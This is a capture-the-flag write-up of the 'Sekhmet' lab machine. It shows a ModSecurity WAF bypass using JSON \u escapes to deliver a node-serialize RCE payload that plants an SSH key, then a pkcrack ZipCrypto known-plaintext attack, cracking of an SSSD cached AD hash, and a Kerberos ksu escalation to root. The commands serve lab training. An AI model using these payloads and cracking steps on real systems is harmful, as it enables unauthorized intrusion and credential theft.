## Overview

Sekhmet is an Insane-rated Windows machine, though the public attack surface is a Linux VM running a NodeJS app. The path to user is a chain of three classic-but-fiddly bugs: an **insecure deserialization** RCE hidden behind a **WAF bypass**, a **ZipCrypto known-plaintext** attack on a backup archive, and a **cached AD credential** that authorizes a Kerberos `ksu` to root on the VM (where `user.txt` lives). This post stops at the user flag.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 80   | nginx (redirects to `windcorp.htb`) |

Port 80 redirects to `www.windcorp.htb`. A vhost scan surfaces `portal.windcorp.htb`, a login page powered by Express (`X-Powered-By: Express`).

```bash
nmap -sC -sV 10.129.10.29
gobuster vhost -u http://windcorp.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

## Enumeration

The portal accepts the guessable credentials `admin:admin`. After login the server sets a `profile` cookie that is **base64 of a serialized object**:

```bash
curl -s -i -H "Host: portal.windcorp.htb" --data 'username=admin&password=admin' http://10.129.10.29/login
# Set-Cookie: profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE3...
echo -n eyJ1c2VybmFtZSI6ImFkbWluI...  | base64 -d
# {"username":"admin","admin":"1","logon":...}
```

A serialized cookie that the server reads back is a red flag for the `node-serialize` library, which executes embedded functions on `unserialize()`.

## Foothold

`node-serialize` runs an immediately-invoked function embedded with the marker `_$$ND_FUNC$$_function(){...}()`. Sending it directly is blocked by a ModSecurity WAF — so the trick is to write the marker's key characters as JSON `\u` escapes. The WAF, scanning the decoded text, sees inert `ND…`; `JSON.parse` on the server canonicalizes them back to `ND`/`function`, rebuilding the payload.

![WAF bypass](/assets/Images/sekhmet-007_foothold_waf-bypass.png)

Rather than a fragile reverse shell, the payload appends our SSH public key to `webster`'s `authorized_keys`. A valid session cookie is carried alongside the malicious one, because the middleware only deserializes the profile when authenticated:

```bash
# payload: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('<append SSH key>')}()"}
curl -s -H "Host: portal.windcorp.htb" -H "Cookie: app=<session>; profile=<b64_payload>" http://10.129.10.29/
ssh -i sekhmet_key webster@10.129.10.29 'id; hostname'
# uid=1000(webster) ... webserver
```

![webster shell](/assets/Images/sekhmet-001_foothold_webster-shell.png)

## Path to user

`webster`'s home holds `backup.zip`, encrypted with the legacy **ZipCrypto** cipher. ZipCrypto is broken by a known-plaintext attack: if you know the original bytes of any one file inside, you recover the keys. Conveniently, the archive contains `etc/passwd` — which we can read in cleartext straight off the host.

```bash
scp -i sekhmet_key webster@10.129.10.29:/home/webster/backup.zip .
scp -i sekhmet_key webster@10.129.10.29:/etc/passwd .
7z l -slt backup.zip | grep -E 'Method|Encrypted'      # ZipCrypto Deflate

extract backup.zip etc/passwd passwd.enc
zip plain.zip passwd
extract plain.zip passwd passwd.plain
pkcrack -c passwd.enc -p passwd.plain                   # recovers key0 key1 key2
zipdecrypt <key0> <key1> <key2> backup.zip decrypted.zip
unzip decrypted.zip
```

The decrypted archive contains an **SSSD credential cache**. SSSD caches AD logon hashes locally; pulling the `$6$` (SHA-512 crypt) hash for `ray.duncan` and cracking it with `rockyou` yields a password.

![SSSD cached hash](/assets/Images/sekhmet-002_lateral_loot-raycache.png)

```bash
strings var/lib/sss/db/cache_windcorp.htb.ldb | grep -aoP '\$6\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{20,}'
john --wordlist=/usr/share/wordlists/rockyou.txt rayhash.txt   # ray.duncan:<redacted>
```

The box's Kerberos config leaves `.k5login` ACLs in play, so `ray.duncan`'s ticket is authorized to `ksu` (Kerberos `su`) directly to root on the VM — where the user flag lives.

```bash
ssh -i sekhmet_key -tt webster@10.129.10.29 'echo <redacted> | kinit ray.duncan && ksu -e /bin/cat /root/user.txt'
```

## User flag

```bash
cat /root/user.txt   # HTB{...}
```

![user flag](/assets/Images/sekhmet-003_lateral_user-flag.png)

Access as root on the Linux VM is achieved and `user.txt` is captured.
